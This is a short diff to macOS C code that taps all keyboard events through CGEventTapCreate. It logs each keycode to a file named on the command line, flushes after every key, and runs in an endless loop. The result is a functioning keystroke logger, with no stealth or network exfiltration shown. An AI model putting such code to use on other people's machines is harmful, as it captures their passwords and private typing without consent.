@@ -8,13 +8,14 @@ CGEventRef callbackKeyEvent (
     CGEventType type, 
     CGEventRef event, 
     void *refcon) {
-  fprintf(fp, "%d\n", (int) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode));
+  fputc((int) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode), fp);
+  fflush(fp);
   return event;
 }
 
-int main() 
+int main(int argc, char* argv[]) 
 {
-  fp = fopen("keypresses", "w");
+  fp = fopen(argv[1], "w");
 
   CFMachPortRef tap = CGEventTapCreate(
     kCGSessionEventTap,
@@ -37,9 +38,7 @@ int main()
 
   CGEventTapEnable(tap, true);
 
-  //CFRunLoopRun();
-  int i = 0;
-  for (i=0; i<=10; i++) {
+  while (true) {
     CFRunLoopRunInMode(kCFRunLoopDefaultMode, 5, false);
   }
 
